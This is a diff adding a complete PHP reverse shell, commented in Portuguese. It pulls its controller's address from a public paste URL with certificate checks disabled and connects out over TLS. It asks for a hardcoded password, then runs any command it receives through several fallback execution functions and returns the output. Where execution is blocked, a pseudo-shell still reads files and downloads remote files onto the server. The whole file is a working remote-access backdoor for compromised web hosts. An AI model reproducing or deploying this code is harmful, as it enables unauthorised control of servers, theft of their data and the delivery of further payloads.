@@ -1,0 +1,325 @@
+<?php
+error_reporting(0);
+
+// Senha fixa para autenticação
+$password = 'zulo1337'; // Altere para a senha desejada
+
+// URL para recuperar host:port dinamicamente
+$config_url = 'https://ideone.com/plain/LxAdkV';
+
+// Valores padrão se a recuperação falhar
+$default_host = '127.0.0.1';
+$default_port = 18421;
+
+// Função para expandir caminhos com "~"
+function expandPath($path) {
+    if (preg_match("#^(~[a-zA-Z0-9_.-]*)(/.*)?$#", $path, $match)) {
+        $home = getenv('HOME');
+        if ($home) {
+            return str_replace('~', $home, $path);
+        }
+    }
+    return $path;
+}
+
+// Função para verificar se todas as funções existem
+function allFunctionExist($list = array()) {
+    foreach ($list as $entry) {
+        if (!function_exists($entry)) {
+            return false;
+        }
+    }
+    return true;
+}
+
+// Função para executar comandos reais
+function executeCommand($cmd) {
+    $output = '';
+    if (function_exists('exec')) {
+        exec($cmd, $output);
+        $output = implode("\n", $output);
+    } else if (function_exists('shell_exec')) {
+        $output = shell_exec($cmd);
+    } else if (allFunctionExist(array('system', 'ob_start', 'ob_get_contents', 'ob_end_clean'))) {
+        ob_start();
+        system($cmd);
+        $output = ob_get_contents();
+        ob_end_clean();
+    } else if (allFunctionExist(array('passthru', 'ob_start', 'ob_get_contents', 'ob_end_clean'))) {
+        ob_start();
+        passthru($cmd);
+        $output = ob_get_contents();
+        ob_end_clean();
+    } else if (allFunctionExist(array('popen', 'feof', 'fread', 'pclose'))) {
+        $handle = popen($cmd, 'r');
+        while (!feof($handle)) {
+            $output .= fread($handle, 4096);
+        }
+        pclose($handle);
+    } else if (allFunctionExist(array('proc_open', 'stream_get_contents', 'proc_close'))) {
+        $handle = proc_open($cmd, array(0 => array('pipe', 'r'), 1 => array('pipe', 'w')), $pipes);
+        $output = stream_get_contents($pipes[1]);
+        proc_close($handle);
+    }
+    return $output;
+}
+
+// Função para verificar se execução de comandos reais está disponível
+function isCommandExecutionAvailable() {
+    $test_output = executeCommand('echo test');
+    return trim($test_output) === 'test';
+}
+
+// Função para pseudo shell (contingência)
+function pseudoShell($cmd, $cwd) {
+    chdir($cwd);
+    $parts = explode(' ', trim($cmd));
+    $command = strtolower(array_shift($parts));
+    $args = implode(' ', $parts);
+    $stdout = '';
+
+    switch ($command) {
+        case 'ls':
+        case 'dir':
+            // Listar arquivos e pastas no diretório atual
+            $files = scandir(getcwd());
+            if ($files !== false) {
+                $stdout = implode("\n", array_filter($files, fn($file) => $file !== '.' && $file !== '..'));
+            } else {
+                $stdout = 'Erro ao listar diretório.';
+            }
+            break;
+        case 'cd':
+            // Mudar diretório
+            if (!empty($args)) {
+                $new_path = expandPath($args);
+                if (chdir($new_path)) {
+                    $stdout = 'Diretório alterado para: ' . getcwd();
+                } else {
+                    $stdout = 'Erro ao mudar diretório.';
+                }
+            } else {
+                chdir(expandPath('~'));
+                $stdout = 'Diretório alterado para home.';
+            }
+            break;
+        case 'upload':
+            // Baixar arquivo de URL e salvar localmente
+            if (!empty($args)) {
+                $url = $args;
+                // Validar URL com expressão regular
+                if (preg_match('/^https?:\/\/[^\s\/$.?#].[^\s]*$/i', $url)) {
+                    // Configurar contexto SSL para upload
+                    $context = stream_context_create([
+                        'ssl' => [
+                            'verify_peer' => false,
+                            'verify_peer_name' => false,
+                            'allow_self_signed' => true
+                        ]
+                    ]);
+                    // Obter headers e conteúdo
+                    $data = @file_get_contents($url, false, $context);
+                    if ($data !== false) {
+                        // Tentar extrair nome do arquivo do header Content-Disposition
+                        $filename = basename($url);
+                        if (!empty($http_response_header)) {
+                            foreach ($http_response_header as $header) {
+                                if (stripos($header, 'Content-Disposition') !== false) {
+                                    if (preg_match('/filename="([^"]+)"/i', $header, $match)) {
+                                        $filename = $match[1];
+                                    } elseif (preg_match('/filename=([^;\s]+)/i', $header, $match)) {
+                                        $filename = $match[1];
+                                    }
+                                }
+                            }
+                        }
+                        // Se basename falhar ou retornar algo genérico, usar último segmento da URL
+                        if (empty($filename) || $filename === 'cron' || is_numeric($filename)) {
+                            $filename = basename(parse_url($url, PHP_URL_PATH)) ?: 'downloaded_file';
+                        }
+                        if (file_put_contents($filename, $data)) {
+                            $stdout = 'Arquivo baixado: ' . $filename;
+                        } else {
+                            $stdout = 'Erro ao salvar arquivo: sem permissão ou disco cheio.';
+                        }
+                    } else {
+                        $stdout = 'Erro ao baixar da URL: conexão falhou ou arquivo não encontrado.';
+                    }
+                } else {
+                    $stdout = 'Formato de URL inválido. Use http:// ou https://.';
+                }
+            } else {
+                $stdout = 'Uso: upload <url>';
+            }
+            break;
+        case 'cat':
+            // Ler conteúdo de arquivo
+            if (!empty($args)) {
+                $file_path = $args;
+                if (file_exists($file_path) && is_readable($file_path)) {
+                    $stdout = file_get_contents($file_path);
+                } else {
+                    $stdout = 'Arquivo não encontrado ou sem permissão de leitura.';
+                }
+            } else {
+                $stdout = 'Uso: cat <arquivo>';
+            }
+            break;
+        case 'pwd':
+            // Mostrar diretório atual
+            $stdout = getcwd();
+            break;
+        case '?':
+        case 'options':
+            // Listar funcionalidades
+            $stdout = "Funcionalidades disponíveis na pseudo shell:\n" .
+                      "- ls ou dir: Listar arquivos e pastas no diretório atual\n" .
+                      "- cd <path>: Mudar diretório (ou cd para home)\n" .
+                      "- upload <url>: Baixar arquivo de URL e salvar localmente\n" .
+                      "- cat <arquivo>: Ler conteúdo de arquivo\n" .
+                      "- pwd: Mostrar diretório atual\n" .
+                      "- ? ou options: Listar funcionalidades";
+            break;
+        default:
+            $stdout = 'Comando não suportado na pseudo shell. Use ? para opções.';
+    }
+
+    return array(
+        "stdout" => $stdout,
+        "cwd" => getcwd()
+    );
+}
+
+// Função principal para executar comandos (com contingência)
+function featureShell($cmd, $cwd) {
+    static $pseudo_mode = null;
+    if ($pseudo_mode === null) {
+        $pseudo_mode = !isCommandExecutionAvailable();
+    }
+
+    if ($pseudo_mode) {
+        return pseudoShell($cmd, $cwd);
+    } else {
+        $stdout = "";
+
+        if (preg_match("/^\s*cd\s*(2>&1)?$/", $cmd)) {
+            chdir(expandPath("~"));
+        } elseif (preg_match("/^\s*cd\s+(.+)\s*(2>&1)?$/", $cmd)) {
+            chdir($cwd);
+            preg_match("/^\s*cd\s+([^\s]+)\s*(2>&1)?$/", $cmd, $match);
+            chdir(expandPath($match[1]));
+        } else {
+            chdir($cwd);
+            $stdout = executeCommand($cmd);
+        }
+
+        return array(
+            "stdout" => $stdout,
+            "cwd" => getcwd()
+        );
+    }
+}
+
+// Recuperar host e porta dinamicamente da URL
+$context = stream_context_create([
+    'ssl' => [
+        'verify_peer' => false,
+        'verify_peer_name' => false,
+        'allow_self_signed' => true
+    ]
+]);
+
+$config_content = @file_get_contents($config_url, false, $context);
+if ($config_content !== false && preg_match('/^([^\s:]+):(\d+)$/', trim($config_content), $matches)) {
+    $remote_host = $matches[1];
+    $remote_port = (int)$matches[2];
+    echo "Host e porta recuperados da URL: {$remote_host}:{$remote_port}\n"; // Log para depuração (remove em produção)
+} else {
+    $remote_host = $default_host;
+    $remote_port = $default_port;
+    echo "Falha ao recuperar config da URL. Usando padrão: {$remote_host}:{$remote_port}\n"; // Log para depuração (remove em produção)
+}
+
+// Configurar contexto SSL para conexão (sem verificação de certificado)
+$context = stream_context_create([
+    'ssl' => [
+        'verify_peer' => false,
+        'verify_peer_name' => false,
+        'allow_self_signed' => true
+    ]
+]);
+
+// Tentar conexão com stream_socket_client
+$socket = false;
+if (function_exists('stream_socket_client')) {
+    $socket = @stream_socket_client("tls://{$remote_host}:{$remote_port}", $errno, $errstr, 30, STREAM_CLIENT_CONNECT, $context);
+    if ($socket) {
+        echo "Conexão estabelecida com stream_socket_client\n"; // Log para depuração (remove em produção)
+    }
+}
+
+// Fallback para fsockopen se stream_socket_client falhar ou não estiver disponível
+if (!$socket && function_exists('fsockopen')) {
+    $socket = @fsockopen($remote_host, $remote_port, $errno, $errstr, 30);
+    if ($socket) {
+        stream_set_blocking($socket, true);
+        if (@stream_socket_enable_crypto($socket, true, STREAM_CRYPTO_METHOD_TLS_CLIENT)) {
+            echo "Conexão estabelecida com fsockopen e TLS\n"; // Log para depuração (remove em produção)
+        } else {
+            fwrite($socket, "Falha ao habilitar TLS com fsockopen\n");
+            fclose($socket);
+            die("Falha ao habilitar TLS com fsockopen\n");
+        }
+    }
+}
+
+// Verificar se a conexão foi estabelecida
+if (!$socket) {
+    die("Falha na conexão: $errstr ($errno)\n");
+}
+
+// Enviar mensagem inicial para autenticação
+$initial_message = "Conectado ao shell reverso. Digite a senha:\n";
+fwrite($socket, $initial_message);
+
+// Ler e verificar a senha
+$received_password = trim(fgets($socket, 1024)); // Buffer para senha longa
+if ($received_password !== $password) {
+    fwrite($socket, "Senha incorreta. Conexão encerrada.\n");
+    fclose($socket);
+    die();
+}
+
+// Enviar mensagem de autenticação bem-sucedida
+fwrite($socket, "Autenticação bem-sucedida. Shell pronta.\n");
+
+// Loop principal da shell reversa
+$cwd = getcwd(); // Diretório de trabalho inicial
+while (!feof($socket)) {
+    // Enviar prompt com diretório atual
+    $prompt = "[shell " . basename($cwd) . "]$ ";
+    fwrite($socket, $prompt);
+
+    // Ler comando do servidor
+    $cmd = trim(fgets($socket, 1024));
+    if ($cmd === false || strlen($cmd) == 0) {
+        continue; // Ignorar comandos vazios ou erros de leitura
+    }
+
+    // Adicionar redirecionamento de erro (apenas se não for pseudo mode)
+    if (!preg_match('/2>/', $cmd) && isCommandExecutionAvailable()) {
+        $cmd .= ' 2>&1';
+    }
+
+    // Executar comando (com contingência para pseudo shell)
+    $response = featureShell($cmd, $cwd);
+
+    // Atualizar diretório de trabalho
+    $cwd = $response['cwd'];
+
+    // Enviar saída para o servidor
+    fwrite($socket, $response['stdout'] . "\n");
+}
+
+fclose($socket);
+?>
